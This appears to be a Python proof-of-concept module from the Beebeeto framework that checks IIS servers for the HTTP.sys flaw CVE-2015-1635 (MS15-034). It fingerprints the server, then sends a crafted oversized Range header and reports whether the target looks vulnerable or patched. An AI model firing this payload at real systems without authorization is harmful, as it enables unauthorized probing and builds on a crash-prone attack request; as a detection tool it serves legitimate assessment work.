#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import socket
import random
import urlparse

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0081',
            'name': 'IIS HTTP.sys 远程代码执行漏洞(CVE-2015-1635) POC',
            'author': 'user1018',
            'create_date': '2015-04-15',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'IIS',
            'vul_version': ['>7.0'],
            'type': 'Code Execution',
            'tag': ['IIS漏洞', 'HTTP.sys漏洞', 'CVE-2015-1635', 'ms15-034'],
            'desc': '''
                    影响范围:
                        Windows7
                        Windows8
                        Windows server 2008
                        Windows server 2012
                    远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求
                    时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。

                    若要利用此漏洞，攻击者必须将经特殊设计的 HTTP 请求发送到受影响的系统。 通过修改 Windows HTTP 堆栈处理
                    请求的方式，安装更新可以修复此漏洞。
                    ''',
            'references': ['https://technet.microsoft.com/zh-CN/library/security/ms15-034.aspx',
                           'http://bobao.360.cn/news/detail/1435.html'],
        },
    }


    def _init_user_parser(self):  # 定制命令行参数
        self.user_parser.add_option('-p','--port',
                                    action='store', dest='port', type=int, default=80,
                                    help='request port.')
        self.user_parser.add_option('--timeout',
                                    action='store', dest='timeout', type=int, default=5,
                                    help='request timeout.')


    @classmethod
    def verify(cls, args):
        target = args['options']['target']
        port = args['options']['port']
        timeout = args['options']['timeout']
        if urlparse.urlparse(target).netloc == '':
            target = urlparse.urlparse(target).path
        else:
            target = socket.gethostbyname(urlparse.urlparse(target).netloc)
            
        headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
        }
        
        if port == 443:
            url = 'https://%s:%d' % (target, port)
        else:
            url = 'http://%s:%d' % (target, port)
        r = requests.get(url, verify=False, headers=headers, timeout=timeout)
        if not r.headers.get('server') or "Microsoft" not in r.headers.get('server'):
            args['poc_ret']['error'] = '[-] Not IIS'
            return args

        hexAllFfff = '18446744073709551615'
        headers.update({
            'Host': 'stuff',
            'Range': 'bytes=0-' + hexAllFfff,
        })
        r = requests.get(url, verify=False, headers=headers, timeout=timeout)
        if "Requested Range Not Satisfiable" in r.content:
            print "[+] Looks Vulnerability!"
            args['success'] = True
            args['poc_ret']['vulnerability'] = '%s:%d' % (target, port)
        elif "The request has an invalid header name" in r.content:
            args['poc_ret']['error'] = "[-] Looks Patched"
        else:
            args['poc_ret']['error'] = "[-] Unexpected response, cannot discern patch status"
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())